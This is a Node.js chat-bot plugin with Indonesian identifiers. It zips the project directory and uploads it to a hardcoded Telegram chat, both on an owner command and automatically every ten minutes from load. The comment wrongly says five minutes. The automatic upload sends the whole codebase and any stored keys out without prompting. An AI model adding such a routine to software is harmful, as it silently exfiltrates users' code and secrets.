const fs = require('fs');
const archiver = require('archiver');
const path = require('path');
const fetch = require('node-fetch');
const FormData = require('form-data');

// Telegram credentials
const TELEGRAM_BOT_TOKEN = 'ISI_TOKEN_DISINI';
const TELEGRAM_CHAT_ID = '2007138982';

let handler = async () => {
  try {
    const { filePath, fileName} = await buatArsip();
    await kirimKeTelegram(filePath, `📤 Arsip manual dikirim: ${fileName}`);
} catch (err) {
    console.error('❌ Gagal membuat atau mengirim arsip:', err.message);
}
};

async function buatArsip() {
  const waktu = new Date().toISOString().replace(/[:.]/g, '-');
  const fileName = `SC-CraXID-Bot.zip`;
  const filePath = `./tmp/${fileName}`;

  const tmpDir = path.resolve('./tmp');
  if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir);

  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(filePath);
    const archive = archiver('zip', { zlib: { level: 9}});

    output.on('close', () => {
      console.log(`✅ Arsip dibuat: ${fileName}`);
      resolve({ filePath, fileName});
});

    archive.on('error', (err) => reject(err));

    archive.pipe(output);
    archive.glob('**/*', {
      cwd: './',
      ignore: [
        'node_modules/**',
        'aseli/**',
        'package-lock.json',
        'tmp/**',
        'sessions/**',
        '.git/**'
      ]
});

    archive.finalize();
});
}

async function kirimArsip() {
  try {
    const { filePath, fileName} = await buatArsip();

    const waktuIndonesia = new Intl.DateTimeFormat('id-ID', {
      weekday: 'long',
      day: 'numeric',
      month: 'long',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZone: 'Asia/Jakarta'
}).format(new Date());

    const caption = `📤 Arsip otomatis dikirim\n🕒 ${waktuIndonesia} WIB\n📁 ${fileName}`;
    await kirimKeTelegram(filePath, caption);

} catch (err) {
    console.error('❌ Gagal kirim arsip otomatis:', err.message);
}
}

async function kirimKeTelegram(filePath, caption = '📤 Arsip otomatis dikirim dari bot') {
  const form = new FormData();
  form.append('chat_id', TELEGRAM_CHAT_ID);
  form.append('caption', caption);
  form.append('document', fs.createReadStream(filePath));

  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: form
});

    const json = await res.json();
    if (!json.ok) throw new Error(json.description);
    console.log('✅ Arsip berhasil dikirim ke Telegram');
} catch (err) {
    console.error('❌ Gagal kirim ke Telegram:', err.message);
}
}

// Kirim arsip otomatis setiap 5 menit
setInterval(() => {
  kirimArsip();
}, 10 * 60 * 1000);

// Handler untuk perintah manual
handler.help = ['getsc'];
handler.tags = ['tools'];
handler.command = /^(getsc)$/i;
handler.rowner = true;

module.exports = handler;